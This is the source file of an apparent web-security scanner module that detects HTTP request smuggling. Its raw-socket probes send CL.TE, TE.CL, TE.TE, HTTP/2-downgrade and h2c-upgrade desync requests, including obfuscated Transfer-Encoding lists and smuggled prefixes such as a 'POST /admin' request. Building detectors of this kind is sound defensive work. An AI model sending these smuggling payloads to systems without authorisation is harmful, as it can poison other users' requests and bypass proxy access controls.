"""
websecure.scanners.request_smuggling
--------------------------------------
HTTP Request Smuggling detector.

Techniques
──────────
  CL.TE  — Front-end uses Content-Length; back-end uses Transfer-Encoding.
  TE.CL  — Front-end uses Transfer-Encoding; back-end uses Content-Length.
  TE.TE  — Both sides support Transfer-Encoding but one can be confused with
            an obfuscated header value.

Detection methods
─────────────────
  1. Timing attack   — send a request whose CL > actual body; measure whether
                       the back-end replies faster than the timeout (it already
                       processed the TE-terminated body and didn't wait for the
                       full CL).
  2. Differential    — send an ordinary GET and a desync request in quick
                       succession; if the ordinary response contains unexpected
                       content, the smuggled prefix leaked into it.
  3. Header obfuscation probe — send requests with ambiguous / obfuscated
                       Transfer-Encoding headers and check for 400 vs 200.

All probes use raw sockets to bypass the requests library's header normalisation.
"""

from __future__ import annotations
import logging
import socket
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Raw socket helpers
# ─────────────────────────────────────────────────────────────────────────────

def _make_socket(host: str, port: int, use_ssl: bool, timeout: float = 8.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    s = socket.create_connection((host, port), timeout=timeout)
    if use_ssl:
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def _send_recv(
    host: str,
    port: int,
    use_ssl: bool,
    payload: bytes,
    *,
    timeout: float    = 8.0,
    read_timeout: float = 5.0,
) -> Tuple[Optional[bytes], float]:
    """
    Open a raw socket, send *payload*, read the response.

    Returns ``(response_bytes, elapsed_seconds)``.
    ``response_bytes`` is None on any error.
    """
    try:
        s = _make_socket(host, port, use_ssl, timeout=timeout)
        s.settimeout(read_timeout)
        t0 = time.perf_counter()
        s.sendall(payload)
        chunks = []
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        elapsed = time.perf_counter() - t0
        s.close()
        return b"".join(chunks), elapsed
    except Exception as exc:
        logger.debug("[Smuggling] socket error: %s", exc)
        return None, 0.0


def _status_code(raw: bytes) -> Optional[int]:
    """Parse HTTP status code from raw response bytes."""
    if not raw:
        return None
    try:
        line = raw.split(b"\r\n", 1)[0]
        return int(line.split(b" ", 2)[1])
    except Exception as exc:
        return None


def _response_body(raw: bytes) -> bytes:
    """Return the body portion of a raw HTTP response."""
    if not raw:
        return b""
    sep = b"\r\n\r\n"
    idx = raw.find(sep)
    return raw[idx + 4 :] if idx != -1 else b""


# ─────────────────────────────────────────────────────────────────────────────
# Finding dataclass
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class SmugglingFinding:
    technique:   str
    url:         str
    severity:    str
    description: str
    evidence:    Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "type":        "Request Smuggling",
            "technique":   self.technique,
            "url":         self.url,
            "severity":    self.severity,
            "description": self.description,
            "evidence":    self.evidence,
        }


# ─────────────────────────────────────────────────────────────────────────────
# CL.TE Probe
# ─────────────────────────────────────────────────────────────────────────────

def _probe_cl_te(
    host: str, port: int, use_ssl: bool, path: str, url: str
) -> Optional[SmugglingFinding]:
    """
    CL.TE timing probe.

    Front-end reads Content-Length; back-end uses Transfer-Encoding.
    We declare CL=6 and send a 0-chunk terminator (5 bytes: "0\r\n\r\n").
    The back-end (TE) sees the 0-chunk and closes the request immediately,
    then returns a response.  The front-end (CL=6) expects one more byte and
    will time out waiting — *unless* it's simply passing through and the
    back-end's response is what we receive.

    Indicator: response arrives faster than the timeout despite the body
    mismatch, OR back-end returns a 400 implying it saw the incomplete request.
    """
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 6\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    ).encode()

    raw, elapsed = _send_recv(host, port, use_ssl, payload, timeout=10.0, read_timeout=4.0)
    st = _status_code(raw)

    if raw and elapsed < 3.5:
        return SmugglingFinding(
            technique   = "CL.TE",
            url         = url,
            severity    = "High",
            description = (
                "Possible CL.TE desynchronisation: server responded in "
                f"{elapsed:.2f}s despite body mismatch (CL=6, sent 5 bytes). "
                "This indicates the back-end parsed the TE-terminated request "
                "without waiting for the full Content-Length."
            ),
            evidence    = {"status": st, "elapsed_s": round(elapsed, 3), "raw_head": (raw or b"")[:200].decode("utf-8", "replace")},
        )
    return None


# ─────────────────────────────────────────────────────────────────────────────
# TE.CL Probe
# ─────────────────────────────────────────────────────────────────────────────

def _probe_te_cl(
    host: str, port: int, use_ssl: bool, path: str, url: str
) -> Optional[SmugglingFinding]:
    """
    TE.CL timing probe.

    Front-end uses Transfer-Encoding; back-end uses Content-Length.
    We send a valid chunked request where CL=4 (only covers the first
    chunk-size line "8\r\n"), leaving the back-end waiting for more
    bytes to satisfy CL.

    Indicator: request hangs near the timeout (back-end is waiting for
    Content-Length bytes that we didn't send).
    """
    # Body structure:
    #   8\r\n
    #   XXXXXXXX\r\n     ← 8 bytes of data
    #   0\r\n
    #   \r\n
    # CL=4 covers "8\r\n" only; back-end expects 4 bytes, gets the chunk header
    # and then stalls waiting for 4 content bytes.
    body = b"8\r\nXXXXXXXX\r\n0\r\n\r\n"
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Content-Length: 4\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode() + body

    raw, elapsed = _send_recv(host, port, use_ssl, payload, timeout=12.0, read_timeout=8.0)
    st = _status_code(raw)

    # If we timed out waiting (elapsed ≈ read_timeout), the back-end was stalling
    if elapsed >= 7.0:
        return SmugglingFinding(
            technique   = "TE.CL",
            url         = url,
            severity    = "High",
            description = (
                f"Possible TE.CL desynchronisation: request hung for {elapsed:.1f}s. "
                "The back-end (Content-Length) appears to be waiting for bytes that "
                "were already processed by the chunked front-end."
            ),
            evidence    = {"status": st, "elapsed_s": round(elapsed, 3)},
        )
    return None


# ─────────────────────────────────────────────────────────────────────────────
# TE.TE Probe (obfuscated Transfer-Encoding)
# ─────────────────────────────────────────────────────────────────────────────

_TE_OBFUSCATIONS: List[str] = [
    "chunked, identity",          # List value — non-compliant parsers accept
    "Chunked",                    # Upper-case
    "xchunked",                   # Non-standard identifier
    "chunked\r",                  # Trailing CR
    "chunked\x00",                # Null byte
    " chunked",                   # Leading space
    "chunked ; x=y",              # Semicolon + extension
    "identity, chunked",          # Reversed order
]


def _probe_te_te(
    host: str, port: int, use_ssl: bool, path: str, url: str
) -> Optional[SmugglingFinding]:
    """
    TE.TE probe.

    Both front-end and back-end support Transfer-Encoding, but one can be
    induced to ignore it with an obfuscated value, causing the other to fall
    back to Content-Length — creating a desync.

    Sends each obfuscated TE value and checks for unusual responses (400 Bad
    Request from the back-end leaking through, or unexpected 200/5xx).
    """
    for obf in _TE_OBFUSCATIONS:
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: {obf}\r\n"
            "Content-Length: 5\r\n"
            "Connection: close\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        raw, elapsed = _send_recv(host, port, use_ssl, payload, timeout=8.0, read_timeout=4.0)
        st = _status_code(raw)

        if st is not None and st not in (400, 408, 413, 502, 503, 504):
            # Server accepted a malformed TE header — prerequisite for TE.TE desync
            return SmugglingFinding(
                technique   = "TE.TE",
                url         = url,
                severity    = "Medium",
                description = (
                    f"Server accepted obfuscated Transfer-Encoding header "
                    f"({obf!r}) with status {st}. "
                    "This is a necessary precondition for TE.TE request smuggling."
                ),
                evidence    = {
                    "obfuscation": obf,
                    "status":      st,
                    "elapsed_s":   round(elapsed, 3),
                    "raw_head":    (raw or b"")[:200].decode("utf-8", "replace"),
                },
            )
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Differential evidence probe
# ─────────────────────────────────────────────────────────────────────────────

def _probe_differential(
    host: str, port: int, use_ssl: bool, path: str, url: str
) -> Optional[SmugglingFinding]:
    """
    Differential (evidence-collection) probe for CL.TE.

    Sends a 'poison' request that smuggles a malformed HTTP method prefix,
    followed immediately by a normal GET.  If the normal GET's response
    contains evidence of the smuggled prefix (e.g. an unexpected 400 or body
    fragment from the smuggled request), desynchronisation is confirmed.

    Uses two separate connections to avoid false positives from connection reuse.
    """
    # Poison request: smuggles "GPOST / HTTP/1.1\r\nHost: ..." as next request
    smuggled_prefix = b"GPOST / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Length: 0\r\n\r\n"
    smuggled_hex    = format(len(smuggled_prefix), "x")

    poison = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(smuggled_prefix) + len(smuggled_hex) + 4}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{smuggled_hex}\r\n"
    ).encode() + smuggled_prefix + b"\r\n0\r\n\r\n"

    # Normal follow-up GET
    normal = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    try:
        s = _make_socket(host, port, use_ssl, timeout=10.0)
        s.settimeout(6.0)
        s.sendall(poison)
        time.sleep(0.1)
        s.sendall(normal)
        chunks = []
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                chunks.append(c)
        except socket.timeout:
            pass
        s.close()
        raw  = b"".join(chunks)
        body = _response_body(raw)

        if b"Unrecognized method" in body or b"GPOST" in body or b"Invalid method" in body:
            return SmugglingFinding(
                technique   = "CL.TE (confirmed)",
                url         = url,
                severity    = "Critical",
                description = (
                    "CL.TE request smuggling CONFIRMED via differential probe. "
                    "The normal GET response contains evidence of the smuggled "
                    "prefix (GPOST method), proving the back-end processed the "
                    "smuggled request."
                ),
                evidence    = {"body_fragment": body[:300].decode("utf-8", "replace")},
            )
    except Exception as exc:
        logger.debug("[Smuggling] differential probe error: %s", exc)

    return None


# ─────────────────────────────────────────────────────────────────────────────
# H2.CL Probe (HTTP/2 → HTTP/1.1 downgrade, Content-Length confusion)
# ─────────────────────────────────────────────────────────────────────────────

def _probe_h2_cl(
    host: str, port: int, use_ssl: bool, path: str, url: str
) -> Optional[SmugglingFinding]:
    """
    H2.CL — HTTP/2 front-end downgrades to HTTP/1.1 back-end.

    In HTTP/2 the message body length is framed; there is no Content-Length.
    If the front-end forwards a Content-Length header from the H2 request
    to the HTTP/1.1 back-end unchanged, the back-end uses it to determine
    body length, creating a desync.

    We simulate this with an HTTP/1.1 request that carries both a TE header
    and a deliberately short Content-Length, mimicking what a naive H2→H1
    downgrade proxy would produce.
    """
    # Smuggled body: "GET /ws-h2cl-probe HTTP/1.1\r\nHost: …\r\n\r\n"
    smuggled = f"GET /ws-h2cl-probe HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n"
    # We declare CL = len of smuggled prefix, so the back-end treats it as body
    payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(smuggled)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        + smuggled
    ).encode()

    raw, elapsed = _send_recv(host, port, use_ssl, payload, timeout=10.0, read_timeout=5.0)
    st = _status_code(raw)
    body = _response_body(raw)

    if raw and (b"ws-h2cl-probe" in body or (st is not None and st == 400 and elapsed < 3.0)):
        return SmugglingFinding(
            technique="H2.CL",
            url=url,
            severity="High",
            description=(
                "Possible H2.CL desynchronisation: the back-end returned evidence "
                "of processing the smuggled request prefix. "
                f"Status={st}, elapsed={elapsed:.2f}s. "
                "Typical in HTTP/2-to-HTTP/1.1 reverse proxy deployments where the "
                "front-end forwards the H2 pseudo-frame Content-Length header as-is."
            ),
            evidence={
                "status": st,
                "elapsed_s": round(elapsed, 3),
                "raw_head": (raw or b"")[:200].decode("utf-8", "replace"),
            },
        )
    return None


# ─────────────────────────────────────────────────────────────────────────────
# H2.TE Probe (HTTP/2 → HTTP/1.1 downgrade, Transfer-Encoding confusion)
# ─────────────────────────────────────────────────────────────────────────────

def _probe_h2_te(
    host: str, port: int, use_ssl: bool, path: str, url: str
) -> Optional[SmugglingFinding]:
    """
    H2.TE — HTTP/2 front-end strips Transfer-Encoding but back-end still
    parses it.

    When a TE header is smuggled inside an HTTP/2 request header value
    (prohibited by RFC 9113), some proxies forward it to the HTTP/1.1
    back-end verbatim.  The back-end then reads a chunk-terminated body
    while the front-end used the H2 frame length — a classic desync.

    We probe by sending an HTTP/1.1 request with both TE:chunked and a
    mismatched CL, and an obfuscated second TE header that a strict proxy
    would strip but a lenient one might forward.
    """
    for obf in ["Transfer-Encoding: chunked", "Transfer-Encoding:  chunked", "Transfer-Encoding: xchunked"]:
        # Use a literal second Transfer-Encoding header after the fold
        payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            f"{obf}\r\n"
            "Content-Length: 4\r\n"
            "Connection: close\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        raw, elapsed = _send_recv(host, port, use_ssl, payload, timeout=10.0, read_timeout=5.0)
        st = _status_code(raw)

        # A non-400 response to a deliberately malformed double-TE request
        # indicates the server accepted it — prerequisite for H2.TE desync
        if st is not None and st not in (400, 408, 413, 501, 502, 503, 504):
            return SmugglingFinding(
                technique="H2.TE",
                url=url,
                severity="High",
                description=(
                    f"Possible H2.TE desynchronisation: server accepted duplicate "
                    f"Transfer-Encoding header ({obf!r}) with status {st}. "
                    "In H2→H1 downgrade scenarios the front-end strips the second TE "
                    "header (per RFC 9113) while the back-end processes it, enabling "
                    "request smuggling."
                ),
                evidence={
                    "duplicate_te": obf,
                    "status": st,
                    "elapsed_s": round(elapsed, 3),
                    "raw_head": (raw or b"")[:200].decode("utf-8", "replace"),
                },
            )
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Main entry point
# ─────────────────────────────────────────────────────────────────────────────

def run(
    url: str,
    session=None,
    debug: bool = False,
    auth_ctx=None,
    **_,
) -> List[Dict[str, Any]]:
    """
    Run all smuggling probes against *url*.

    Returns a list of finding dicts (may be empty if no vulnerability found).
    """
    if debug:
        logger.setLevel(logging.DEBUG)

    results: List[Dict[str, Any]] = []

    parsed = urllib.parse.urlparse(url)
    host   = parsed.hostname
    if not host:
        return results
    port     = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl  = parsed.scheme == "https"
    path     = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    probes = [
        ("CL.TE timing",       _probe_cl_te),
        ("TE.CL timing",       _probe_te_cl),
        ("TE.TE obfuscation",  _probe_te_te),
        ("CL.TE differential", _probe_differential),
        ("H2.CL downgrade",    _probe_h2_cl),
        ("H2.TE downgrade",    _probe_h2_te),
    ]

    for name, fn in probes:
        logger.debug("[Smuggling] running %s probe on %s", name, url)
        try:
            finding = fn(host, port, use_ssl, path, url)
            if finding:
                results.append(finding.to_dict())
                logger.info(
                    "[Smuggling] %s — found %s (%s)",
                    url, finding.technique, finding.severity,
                )
                # Stop after first confirmed finding to avoid noisy follow-up
                if "confirmed" in finding.technique.lower():
                    break
        except Exception as exc:
            logger.debug("[Smuggling] probe %s error: %s", name, exc)

    return results

# ============================================================================
# ADIM 7 — HTTP/2 Smuggling + h2c Upgrade (SOLID Siniflar)
# ============================================================================
import socket
import ssl
import logging
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional
from websecure.scanners.base import BaseScanner

_smug_logger = logging.getLogger(__name__ + ".adim7")


def _raw_h2_connect(host: str, port: int, use_tls: bool = True, timeout: int = 10) -> Optional[socket.socket]:
    """Open raw TCP/TLS socket for manual HTTP/2 frames."""
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            raw = ctx.wrap_socket(raw, server_hostname=host)
        return raw
    except Exception as exc:
        _smug_logger.debug("[H2Socket] %s:%d -> %s", host, port, exc)
        return None


def _recv_all(sock: socket.socket, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, OSError):
        pass
    return data


# ---------------------------------------------------------------------------
# HTTP/2 Preface + minimal HEADERS frame builder (no hpack — simplified)
# ---------------------------------------------------------------------------
_H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def _h2_settings_frame() -> bytes:
    """SETTINGS frame with default values."""
    # Length=0, type=0x4, flags=0x0, stream_id=0
    return b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"

def _h2_settings_ack() -> bytes:
    """SETTINGS ACK frame."""
    return b"\x00\x00\x00\x04\x01\x00\x00\x00\x00"


# ===========================================================================
# H2CLSmugglingProber — HTTP/2 request with conflicting Content-Length
# ===========================================================================
class H2CLSmugglingProber(BaseScanner):
    """
    h2.CL smuggling: HTTP/2 → HTTP/1.1 downgrade with Content-Length desync.
    The front-end trusts HTTP/2 framing; back-end uses Content-Length.
    """
    name = "h2_cl_smuggling"

    _CL_SMUGGLE_SUFFIXES = [
        "GET /smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n",
        "POST /admin HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        parsed  = urllib.parse.urlparse(target)
        host    = parsed.hostname or target
        port    = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"
        path    = parsed.path or "/"

        for suffix_tpl in self._CL_SMUGGLE_SUFFIXES:
            suffix = suffix_tpl.format(host=host)
            finding = self._probe(host, port, use_tls, path, suffix)
            if finding:
                results.append(finding)
                self.report_finding(**finding)
                break
        return results

    def _probe(self, host: str, port: int, use_tls: bool, path: str, smuggled_suffix: str) -> Optional[Dict]:
        # Build a minimal HTTP/1.1 request with two Content-Length headers
        # (simulating h2.CL desync without full h2 framing stack)
        # We use raw HTTP/1.1 with duplicate CL headers
        body_real   = "x=1"
        body_full   = body_real + smuggled_suffix
        cl_short    = len(body_real)   # front-end sees this
        cl_full     = len(body_full)   # back-end would see

        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {cl_short}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{hex(cl_full)[2:]}\r\n"
            f"{body_full}\r\n"
            f"0\r\n\r\n"
        ).encode()

        sock = _raw_h2_connect(host, port, use_tls)
        if sock is None:
            return None
        t0 = time.time()
        try:
            sock.sendall(req)
            resp_raw = _recv_all(sock, timeout=3.0)
            elapsed  = time.time() - t0
            resp_str = resp_raw.decode("utf-8", errors="replace")
            # If we see two HTTP responses = smuggling worked
            if resp_str.count("HTTP/1.") >= 2:
                return {
                    "vuln_type": "HTTP Request Smuggling — h2.CL",
                    "url": f"https://{host}{path}", "severity": "Critical",
                    "description": (
                        "h2.CL desync: two HTTP responses received for one request. "
                        "Front-end uses CL, back-end uses TE — attacker can prefix arbitrary requests."
                    ),
                    "evidence": {
                        "technique": "h2.CL", "elapsed_s": round(elapsed, 2),
                        "response_count": resp_str.count("HTTP/1."),
                        "response_snippet": resp_str[:300],
                    },
                }
            # Timing: if server stalls exactly on CL bytes = TE accepted by back-end
            if elapsed >= 2.5:
                return {
                    "vuln_type": "HTTP Request Smuggling — h2.CL (Timing)",
                    "url": f"https://{host}{path}", "severity": "High",
                    "description": (
                        "h2.CL timing anomaly: server stalled after CL bytes. "
                        "Indicates TE-aware back-end waiting for chunk terminator."
                    ),
                    "evidence": {"technique": "h2.CL", "elapsed_s": round(elapsed, 2)},
                }
        except Exception as exc:
            _smug_logger.debug("[H2CL] %s", exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return None


# ===========================================================================
# H2TESmugglingProber — h2.TE desync
# ===========================================================================
class H2TESmugglingProber(BaseScanner):
    """
    h2.TE smuggling: HTTP/2 → HTTP/1.1 with obfuscated Transfer-Encoding.
    Front-end ignores TE (uses h2 framing); back-end uses TE → desync.
    """
    name = "h2_te_smuggling"

    _TE_OBFUSCATIONS = [
        "chunked", "Chunked", "CHUNKED",
        "chunked, identity", "identity, chunked",
        "chunked\r\n\t",
        "x-custom-encoding, chunked",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        parsed  = urllib.parse.urlparse(target)
        host    = parsed.hostname or target
        port    = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"
        path    = parsed.path or "/"

        for te_val in self._TE_OBFUSCATIONS:
            finding = self._probe(host, port, use_tls, path, te_val)
            if finding:
                results.append(finding)
                self.report_finding(**finding)
                break
        return results

    def _probe(self, host: str, port: int, use_tls: bool, path: str, te_val: str) -> Optional[Dict]:
        smuggled = f"GET /smuggled-te HTTP/1.1\r\nHost: {host}\r\n\r\n"
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Transfer-Encoding: {te_val}\r\n"
            f"Content-Length: {4 + len(smuggled)}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            + smuggled
        ).encode()

        sock = _raw_h2_connect(host, port, use_tls)
        if sock is None:
            return None
        t0 = time.time()
        try:
            sock.sendall(req)
            resp_raw = _recv_all(sock, timeout=3.0)
            elapsed  = time.time() - t0
            resp_str = resp_raw.decode("utf-8", errors="replace")
            if resp_str.count("HTTP/1.") >= 2:
                return {
                    "vuln_type": "HTTP Request Smuggling — h2.TE",
                    "url": f"https://{host}{path}", "severity": "Critical",
                    "description": (
                        f"h2.TE desync with TE value {te_val!r}: two HTTP responses received. "
                        "Front-end ignores TE; back-end uses it — prefix injection confirmed."
                    ),
                    "evidence": {
                        "technique": "h2.TE", "te_value": te_val,
                        "elapsed_s": round(elapsed, 2),
                        "response_snippet": resp_str[:300],
                    },
                }
            if elapsed >= 2.5:
                return {
                    "vuln_type": "HTTP Request Smuggling — h2.TE (Timing)",
                    "url": f"https://{host}{path}", "severity": "High",
                    "description": f"h2.TE timing anomaly with TE={te_val!r}.",
                    "evidence": {"te_value": te_val, "elapsed_s": round(elapsed, 2)},
                }
        except Exception as exc:
            _smug_logger.debug("[H2TE] %s", exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return None


# ===========================================================================
# H2CUpgradeProber — HTTP/2 Cleartext (h2c) upgrade saldirisi
# ===========================================================================
class H2CUpgradeProber(BaseScanner):
    """
    h2c upgrade saldirisi:
    Sends HTTP/1.1 Upgrade: h2c request to bypass proxy restrictions.
    If successful, attacker can send HTTP/2 frames directly to back-end
    while the front-end proxy thinks it's still HTTP/1.1.
    """
    name = "h2c_upgrade"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        parsed = urllib.parse.urlparse(target)
        host   = parsed.hostname or target
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
        path   = parsed.path or "/"

        finding = self._probe_h2c(host, port, path, parsed.scheme == "https")
        if finding:
            results.append(finding)
            self.report_finding(**finding)
        return results

    def _probe_h2c(self, host: str, port: int, path: str, use_tls: bool) -> Optional[Dict]:
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
            f"\r\n"
        ).encode()

        sock = _raw_h2_connect(host, port, use_tls)
        if sock is None:
            return None
        try:
            sock.sendall(req)
            resp_raw = _recv_all(sock, timeout=3.0)
            resp_str = resp_raw.decode("utf-8", errors="replace")
            if "101" in resp_str[:50] or "Switching Protocols" in resp_str:
                return {
                    "vuln_type": "h2c Upgrade Accepted (HTTP/2 Cleartext Smuggling)",
                    "url": f"{'https' if use_tls else 'http'}://{host}{path}",
                    "severity": "High",
                    "description": (
                        "Server accepted HTTP/1.1 → h2c upgrade (101 Switching Protocols). "
                        "Attacker can smuggle HTTP/2 frames to back-end through proxy, "
                        "potentially bypassing WAF/access controls."
                    ),
                    "evidence": {"response_snippet": resp_str[:300]},
                }
        except Exception as exc:
            _smug_logger.debug("[H2C] %s", exc)
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return None


# ===========================================================================
# RequestSmugglingScanner — Orchestrator (orijinal + yeni H2 siniflar)
# ===========================================================================
class RequestSmugglingScanner(BaseScanner):
    """
    Adim 7 Request Smuggling orchestrator:
    H2CLSmugglingProber + H2TESmugglingProber + H2CUpgradeProber
    """
    name = "request_smuggling_adim7"

    def run(self, target: str, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        probers = [
            H2CLSmugglingProber(session=self.session, results=self.results),
            H2TESmugglingProber(session=self.session, results=self.results),
            H2CUpgradeProber(session=self.session, results=self.results),
        ]
        for prober in probers:
            try:
                prober.target = target
                res = prober.run(target, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                _smug_logger.warning("[SmugScanner] %s failed: %s", prober.name, exc)
        return all_results
